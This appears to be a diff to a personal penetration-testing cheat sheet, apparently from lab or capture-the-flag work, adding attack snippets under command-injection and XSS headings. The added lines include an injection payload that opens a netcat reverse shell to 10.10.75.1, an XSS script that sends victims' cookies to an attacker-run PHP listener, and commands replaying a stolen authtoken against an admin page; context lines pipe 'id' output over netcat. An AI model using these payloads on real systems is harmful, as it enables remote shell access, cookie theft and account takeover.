@@ -11,6 +11,9 @@
 	\`echo Injected\`
 	>(Echo Injected)
 	Josh;id #
+### Exploitation
+nc -nlvvvp 11111
+127.0.0.1 && nc -e /bin/sh 10.10.75.1 11111
 
 ### Creston DGE-100 attack against DGE-100 Control Console 
 nc -nlvp 8080
@@ -22,3 +25,12 @@ ping $(echo "$(id)" | /system/xbin/nc 192.168.1.1 8080)
 ## SSRF and IMDS
 
 ## XSS 
+### CookieStealer
+try with hello <hr> <hr> <hr> 
+use cookiecutter
+	php -S 0.0.0.0:2222
+<script>document.location='http://10.10.75.1:2222/?'+document.cookie;</script>
+jq "." cookies.log
+curl -b authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb "http://www.rookaviary.com/admin.php"
+### Or Via Browser in Console 
+	document.cookie="authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb"
